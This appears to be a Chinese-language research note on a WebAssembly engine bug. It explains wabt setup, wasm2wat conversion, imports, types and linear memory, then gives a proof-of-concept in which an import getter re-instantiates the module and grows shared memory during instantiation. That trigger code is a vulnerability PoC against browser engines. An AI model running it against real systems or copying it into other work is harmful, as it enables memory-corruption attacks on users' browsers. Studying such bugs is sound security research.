### wasm

wabt搭建：
```
git clone --recursive https://github.com/WebAssembly/wabt 
cd wabt
make
```

用 010 editer创建二进制文件test.wasm
![](./img/1.png)

```
# parse test.wasm and write test.wat
$ bin/wasm2wat test.wasm -o test.wat
```
![](./img/2.png)
详细内容可以看下这个文档：http://webassembly.org.cn/getting-started/js-api/

简单介绍一下这段代码：
- WebAssembly 模块可以通过 import 和 export 来导出和引入函数，在此处：(import "mod" "imp" (func (;0;) (type 0))) ，WebAssembly 引入了一个有两个层级的命名空间，同样的，我们必须提供一个两级的命名空间作为 import 对象传递给 instantiate。

```
  var ffi = {
    mod: {
      get imp() {
        console.log('getter');
        wasm2 = new WebAssembly.Instance(mod, {mod: {imp: function(){}}});
        spacer = new ArrayBuffer(0x10000);
        return function() {};
      }
    }
  };
```
- wasm当前有四个可用类型：
    - i32：32位整数
    - i64：64位整数
    - f32：32位浮点数
    - f64：64位浮点数

- 线性内存访问通过显式调用 load 和 store 运算符完成。i32.load: 加载4字节，转换为32位整数;i32.store: (不转换) 存储4字节。

- 总的来说就是导出了两个函数（一个读一个写），引入了一个函数，需要自己实现。

### Root Case

poc：
```
// raw_wasm = ...
var mod = WebAssembly.Module(raw_wasm);
var ffi = {
  mod: {
    get imp() {
      wasm2 = WebAssembly.Instance(mod, {mod: {imp: function(){}}});
      spacer = new ArrayBuffer(0x10000);
      return function() {};
    }
  }
};
wasm = WebAssembly.Instance(mod, ffi);
wasm2.exports.memory.grow(1);
// wasm.exports.XXX
```



